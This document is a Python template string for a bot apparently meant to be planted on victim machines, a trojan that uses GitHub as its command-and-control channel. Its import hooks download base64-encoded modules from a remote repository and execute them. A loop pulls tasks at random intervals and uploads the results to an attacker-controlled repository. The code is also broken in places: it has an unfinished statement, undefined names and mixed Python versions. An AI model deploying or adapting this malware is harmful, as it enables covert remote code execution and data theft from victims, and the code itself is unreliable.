

botcode = '''\
import json
import base64
import sys
import time
import imp
import marshal
import random
import threading
import Queue
import os

try:
    from urllib2 import urlopen, Request
except ImportError:
    from urllib.request import urlopen, Request

_id = '%s'
_group='%s'
_baseAcc='%s'
_retAcc='%s'
_config = '%s.json' % _id
data_path = 'data/%s/' % _id
_modules = []
configured = False
task_queue = Queue.Queue()


def _request(method='GET', uri=None, data=None, headers=None):
    url = 'https://api.github.com'
    url = uri if url in uri else (url + uri)
    req = Request(url)
    req.headers = {'User-Agent': 'Test-App',
                   'Accept': 'application/vnd.github.v3+json'}
    if headers:
        req.headers.update(headers)
    req.get_method = lambda: method
    if data:
        data = dumps(data, ensure_ascii=False)
    try:
        rsp = urlopen(req, data)
    except Exception as e:
        rsp = None
    return rsp


def auth_reqest(user, password, method='GET', uri=None,
                data=None, headers=None):
    auth_hash = ':'.join((user, password)).encode('base64').strip()
    headers = headers or {{}}
    headers.update({'Authorization': 'Basic ' + auth_hash})
    return _request(method=method, uri=uri, data=data, headers=headers)


def token_request(token, method='GET', uri=None, data=None, headers=None):
    headers = headers or {{}}
    headers.update({'Authorization': 'token ' + token})
    return _request(method=method, uri=uri, data=data, headers=headers)


def request(upot, method='GET', uri=None, data=None, headers=None):
    if ':' in upot:
        user, password = upot.split(':', 1)
        return auth_reqest(user, password, method, uri, data, headers)
    return token_request(upot, method, uri, data, headers)


def put(owner, token, repo, path, content, msg='new file'):
    """
    PUT /repos/:owner/:repo/contents/:path
    """
    uri = '/repos/%s/%s/contents/%s' % (owner, repo, path)
    data = {'message': msg, 'content': content.encode('base64')}
    return request(token, 'PUT', uri, data)


def get(owner, token, repo, path):
    """
    GET /repos/:owner/:repo/contents/:path
    """
    uri = '/repos/%s/%s/contents/%s' % (owner, repo, path)
    rsp = request(token, uri=uri)
    content = loads(rsp.read().strip()) if rsp else {{}}
    # return content.get('content', '').decode('base64'), content
    return content


def update(owner, token, repo, path, content, sha, msg='update file'):
    """
    PUT /repos/:owner/:repo/contents/:path
    """
    uri = '/repos/%s/%s/contents/%s' % (owner, repo, path)
    data = {'message': msg, 'content': content.encode('base64'), 'sha': sha}
    return request(token, 'PUT', uri, data)


def delete(owner, token, repo, path, sha, msg='delete file'):
    """
    DELETE /repos/:owner/:repo/contents/:path
    """
    uri = '/repos/%s/%s/contents/%s' % (owner, repo, path)
    data = {'message': msg, 'sha': sha}
    return request(token, 'DELETE', uri, data)


def get_raw(path, owner=None, repo=None, branch='master'):
    if path.startswith('http'):
        url = path
    else:
        raw_url = 'https://raw.githubusercontent.com'
        uri = '/%s/%s/%s/%s' % (owner, repo, branch, path)
        url = raw_url + uri
    try:
        logging.info('[*] Get raw data from %s' % url)
        rsp = urlopen(url).read()
    except Exception as e:
        logging.error('[-] Get error from %s' % url)
        logging.exception(e)
        rsp = ''
    return rsp


def get_file_contents(filepath):
    gu = _baseAcc.split(':')[0]
    gr = _baseAcc.split('@')[1]
    return get_raw(filepath, gu, gr)


def get_config():
    global configured
    config = get_file_contents(_config)
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])

    return config


def store_module_result(data):
    gh = _retAcc.
    remote_path = 'data/%s/%d.data' % (_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "commit message", base64.b64encode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, fullname, path=None):
        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            fullname = fullname.replace('.', '/')
            new_library = get_file_contents('modules/%s' % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        print name
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module


gmodules = {{}}
gh_package = True


class GHLoader(object):

    def __init__(self, fullname, contents, ext, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.ext = ext
        self.is_pkg = is_pkg
        self.path = path
        self.archive = ''

    def load_module(self, fullname):
        imp.acquire_lock()
        try:
            if fullname is sys.modules:
                return sys.modules[fullname]
            mod = None
            c = None
            if self.ext is 'py':
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'GH://{{}}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                code = compile(self.contents, mod.__file__, 'exec')
                exec(code, mod.__dict__)

            elif self.ext in ('pyc', 'pyo'):
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'GH://{{}}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname] = mod
                exec(marshal.loads(self.contents[8:]), mod.__dict__)
            # elif self.ext in ('dll', 'pyd', 'so'):
            #     init_name = 'init' + fullname.rsplit('.', 1)[-1]
            #     path = self.fullname.rsplit('.', 1)[0].replace('.', '/') + '.' + self.ext
            #     mod =
        except Exception:
            if fullname in sys.modules:
                del sys.modules[fullname]
        finally:
            self.contents = None
            imp.release_lock()
        return sys.modules[fullname]


class GHImportErr(ImportError):
    pass


class GHFinder(object):
    search_lock = None
    search_set = set()

    def __init__(self, path=None):
        if path and not path.startswith('GH://'):
            raise GHImportErr()

    def find_module(self, fullname, path=None, second=False):
        global gmodules
        global gh_package

        print fullname
        print path

        def get_module_files(fullname):
            """ return the file to load """

            path = fullname.replace('.', '/')

            files = [
                module for module in gmodules.iterkeys() \
                if module.rsplit(".", 1)[0] == path or any([
                    path + '/__init__' + ext == module for ext in [
                        '.py', '.pyc', '.pyo'
                    ]
                ])
            ]

            if len(files) > 1:
                # If we have more than one file, than throw away dlls
                files = [x for x in files if not x.endswith('.dll')]

            return files
        imp.acquire_lock()
        selected = None
        try:
            files = get_module_files(fullname)
            ghfiles = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for gh in ghfiles:
                for pyfile in files:
                    if gh(pyfile) and pyfile in modules:
                        selected = pyfile
                        break

            if not selected:
                return None

            content = modules[selected]
            ext = selected.rsplit('.', 1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__' + ex) for ex in ['.pyo', '.pyc', '.py']
            ])

            return GHLoader(fullname, content, ext, is_pkg, selected)

        except Exception as e:
            raise e

        finally:
            del gmodules[selected]
            imp.release_lock()


sys.meta_path = [GitImporter()]
sys.path_hooks.append(GHFinder)
sys.path.append('GH://')
# sys.path.append('gh://')

sys.path_hooks.append(GitImporter())
sys.path.append('GH://')
# sys.path.append('gh://')
# sys.meta_path = [GitImporter()]


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return


while True:
    if task_queue.empty():
        config = get_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))

'''
